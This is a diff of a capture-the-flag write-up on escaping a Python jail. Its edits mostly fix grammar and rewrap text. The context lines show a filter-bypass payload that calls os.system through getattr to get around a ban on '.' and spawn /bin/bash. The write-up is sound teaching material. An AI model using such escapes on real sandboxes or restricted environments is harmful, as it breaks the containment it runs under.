@@ -40,14 +40,14 @@ Do you think my code is so insecure ?
 You can never get out of my jail :)
 ```
 
-We found a interesting Jail fonction :
+We found an interesting Jail fonction :
 
 ```BASH
 >>> print(dir())
 ['Jail', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', 'a', 'cmd', 'execute', 'intro', 'os', 'sys']
 ```
 
-But nothing to do with it...
+But nothing to deal with it...
 
 ```BASH
 >>> print(Jail)
@@ -65,7 +65,8 @@ We want to escape the jail so how can we exec a shell like /bin/bash ?
 But we don't have the right to use "."
 The trick here is to use the getattr function !
 "getattr(object, name[, default])
-Return the value of the named attribute of object.  name must be a string. If the string is the name of one of the object’s attributes, the result is the value of that attribute.  For example, getattr(x, 'foobar') is equivalent to x.foobar.  If the named attribute does not exist, default is returned if provided, otherwise AttributeError is raised."
+Return the value of the named attribute of object.  name must be a string. If the string is the name of one of the object’s attributes, the result is the value of that attribute.  
+For example, getattr(x, 'foobar') is equivalent to x.foobar.  If the named attribute does not exist, default is returned if provided, otherwise AttributeError is raised."
 
 ```BASH
 print(getattr(os, "system")("/bin/bash"))
